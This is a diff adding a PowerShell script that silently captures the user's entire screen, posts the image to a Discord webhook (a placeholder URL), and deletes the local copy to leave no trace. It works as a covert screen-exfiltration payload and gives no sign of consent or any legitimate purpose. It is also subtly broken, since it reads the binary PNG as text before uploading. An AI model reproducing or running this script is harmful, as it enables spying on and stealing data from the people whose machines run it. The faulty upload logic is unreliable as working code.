@@ -1,0 +1,36 @@
+# Define the path where the screenshot will be saved
+$screenshotPath = "$env:TEMP\screenshot.png"
+
+# Take the screenshot
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$screenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, 
+                                               [System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
+$graphics = [System.Drawing.Graphics]::FromImage($screenshot)
+$graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $screenshot.Size)
+$screenshot.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$screenshot.Dispose()
+
+# Define the Discord webhook URL
+$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
+
+# Create a multipart/form-data body for the file upload
+$boundary = [System.Guid]::NewGuid().ToString()
+$headers = @{
+    "Content-Type" = "multipart/form-data; boundary=$boundary"
+}
+$bodyLines = @()
+$bodyLines += "--$boundary"
+$bodyLines += "Content-Disposition: form-data; name=`"file1`"; filename=`"screenshot.png`""
+$bodyLines += "Content-Type: image/png"
+$bodyLines += ""
+$bodyLines += [System.IO.File]::ReadAllText($screenshotPath)
+$bodyLines += "--$boundary--"
+$body = $bodyLines -join "`r`n"
+
+# Send the screenshot to the Discord webhook
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
+
+# Clean up the screenshot file
+Remove-Item $screenshotPath
